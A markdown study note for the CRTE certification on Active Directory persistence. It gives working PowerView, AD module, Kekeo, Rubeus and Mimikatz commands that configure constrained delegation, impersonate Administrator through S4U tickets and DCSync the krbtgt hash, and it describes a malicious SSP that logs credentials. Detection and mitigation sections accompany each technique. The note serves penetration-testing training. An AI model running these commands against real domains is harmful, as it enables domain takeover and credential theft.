# AD Persistence - CRTE

## Overview
Advanced Active Directory persistence techniques for CRTE certification.

> Some content are similar to CRTP. See [AD Persistence - CRTP](https://johnermac.github.io/notes/crtp/domdom/) for overlapping content.

**Sources**:
- [johnermac.github.io](https://johnermac.github.io/review/crte/)
- [slytechroot/CRTO-CRTP-CRTE](https://github.com/slytechroot/CRTO-CRTP-CRTE)
- [francescolonardo/CRTE-Preparation](https://github.com/francescolonardo/CRTE-Preparation)

## msDS-AllowedToDelegateTo (Constrained Delegation)

Note that the **msDS-AllowedToDelegateTo** is the user account flag which controls the services to which a user account has access to.

> This means, with enough privileges, it is possible to access any service from a user

**Key Points**:
- Enough privileges? – SeEnableDelegationPrivilege on the DC and full rights on the target user - default for Domain Admins and Enterprise Admins
- That is, we can force set **Trusted to Authenticate for Delegation** and **ms-DS-AllowedToDelegateTo** on a user (or create a new user - which is more noisy) and abuse it later

### Configure Constrained Delegation on User

**Using PowerView**:
```powershell
Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/dc.domain.local"}
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
Get-DomainUser –TrustedToAuth
```

**Using AD module**:
```powershell
Set-ADUser -Identity devuser -ServicePrincipalNames @{Add='dev/svc'}
Set-ADUser -Identity devuser -Add @{'msDS-AllowedToDelegateTo'= @('ldap/us-dc','ldap/dc.domain.local')} -Verbose
Set-ADAccountControl -Identity devuser -TrustedToAuthForDelegation $true
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

### Abuse Using Kekeo

```powershell
kekeo# tgt::ask /user:devuser /domain:domain.local /password:Password@123!
kekeo# tgs::s4u /tgt:TGT_devuser@domain.local_krbtgt~us.techcorp.local@domain.local.kirbi /user:Administrator@domain.local /service:ldap/domain.local
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.techcorp.local@domain.local_ldap~dc.domain.local@domain.local.kirbi"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

### Abuse Using Rubeus

```powershell
Rubeus.exe hash /password:Password@123! /user:devuser /domain:domain.local
Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/dc.domain.local /domain:domain.local /ptt
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\krbtgt" "exit"
```

### Defense - Constrained Delegation on User
> See [AD Defense - ACL Attacks](../crtp/ad-defense.md#defense---acl-attacks) for detailed detection and mitigation

**Detection**:
- Security Event ID 5136 - Monitor for msDS-AllowedToDelegateTo modifications
- Security Event ID 5136 - Monitor for TrustedToAuthForDelegation changes
- Security Event ID 4769 - Monitor for S4U requests
- Monitor for SPN additions to user accounts

**Mitigation**:
- Limit who can configure constrained delegation (SeEnableDelegation privilege)
- Monitor for unauthorized delegation configuration
- Use Resource-Based Constrained Delegation where possible
- Regularly audit delegation settings

## Malicious SSP

**Key Point**:
- All local logons on the DC are logged to **C:\Windows\system32\kiwissp.log**

This technique allows logging of all authentication attempts on the domain controller, providing persistent credential harvesting.

### Defense - Malicious SSP
> See [AD Defense - Malicious SSP](../crtp/ad-defense.md#defense---malicious-ssp) for detailed detection and mitigation

**Detection**:
- Security Event ID 4657 - Audit creation/change of HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages
- Monitor for mimilib.dll in system32
- Monitor for lsass process injection
- Check for kiwissp.log file creation

**Mitigation**:
- Monitor registry changes to Security Packages
- Use application whitelisting to prevent DLL injection
- Monitor for unauthorized SSP installation
- Regularly audit Security Packages registry key

## Tools
- **PowerView** - Domain object manipulation
- **Active Directory Module** - Native AD cmdlets
- **Kekeo** - Kerberos ticket manipulation
- **Rubeus** - Advanced Kerberos operations
- **Mimikatz/SafetyKatz** - DCSync and credential extraction

## Last Updated
December 29, 2023
